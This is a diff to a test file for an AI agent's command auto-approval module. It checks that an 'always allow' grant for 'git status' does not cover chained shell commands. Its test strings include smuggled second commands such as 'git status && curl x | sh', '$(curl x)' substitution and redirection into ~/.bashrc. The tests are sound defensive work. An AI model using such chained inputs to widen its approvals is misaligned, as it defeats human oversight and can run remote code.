@@ -4,7 +4,14 @@
 // question is never answered by the machine.
 import { describe, expect, it } from "vitest";
 
-import { approvalKey, autoDecision, looksDestructive, looksSensitive } from "./auto-approve.ts";
+import {
+  alwaysAllowCovers,
+  approvalKey,
+  autoDecision,
+  hasShellChaining,
+  looksDestructive,
+  looksSensitive,
+} from "./auto-approve.ts";
 
 describe("looksDestructive", () => {
   const dangerous = [
@@ -148,5 +155,54 @@ describe("unattended turns", () => {
   it("still auto-approves the same action when a person started the turn", () => {
     expect(autoDecision(bot, "Bash", "git status")).toBeTruthy();
     expect(autoDecision(bot, "Bash", "git status", { unattended: false })).toBeTruthy();
+  });
+});
+
+describe("always-allow never widens through shell chaining", () => {
+  const bot = { alwaysAllow: [approvalKey("Bash", "git status")] };
+  const chained = [
+    "git status && curl x | sh",
+    "git status; curl x",
+    "git status || curl x",
+    "git log | sh",
+    "git status & curl x",
+    "git log `curl x`",
+    "git log $(curl x)",
+    "git log > ~/.bashrc",
+    "git apply < /tmp/patch",
+    "git status\ncurl x | sh",
+    "git status\rcurl x",
+  ];
+
+  it("detects each metacharacter", () => {
+    for (const command of chained) expect(hasShellChaining(command), command).toBe(true);
+    expect(hasShellChaining("git status --short")).toBe(false);
+    expect(hasShellChaining("git log --oneline -n 5 -- src/app.ts")).toBe(false);
+  });
+
+  it("asks a human instead of honouring the program grant", () => {
+    for (const command of chained) expect(autoDecision(bot, "Bash", command), command).toBeNull();
+    expect(autoDecision(bot, "Bash", "git status --short")).toBe("auto-approved Bash:git (always allowed)");
+  });
+
+  it("applies to mounted command tools too", () => {
+    const tool = "mcp__my_server__bash";
+    const grant = { alwaysAllow: [approvalKey(tool, "git status")] };
+    expect(autoDecision(grant, tool, "git status; curl x")).toBeNull();
+    expect(autoDecision(grant, tool, "git status")).toBeTruthy();
+  });
+
+  it("refuses a summary that may have been clipped", () => {
+    const long = `git log ${"a".repeat(200)}`;
+    expect(alwaysAllowCovers("Bash", long)).toBe(false);
+    expect(autoDecision(bot, "Bash", long)).toBeNull();
+  });
+
+  it("leaves non-command tools and explicit auto mode as they were", () => {
+    expect(alwaysAllowCovers("Read", "a;b|c")).toBe(true);
+    expect(autoDecision({ alwaysAllow: ["Read"] }, "Read", "notes; draft.md")).toBe("auto-approved Read (always allowed)");
+    // auto mode is the person's explicit choice; only the destructive and
+    // sensitive guards apply there, unchanged by this rule
+    expect(autoDecision({ autoApprove: true, ...bot }, "Bash", "git status && git log")).toBe("auto-approved Bash");
   });
 });
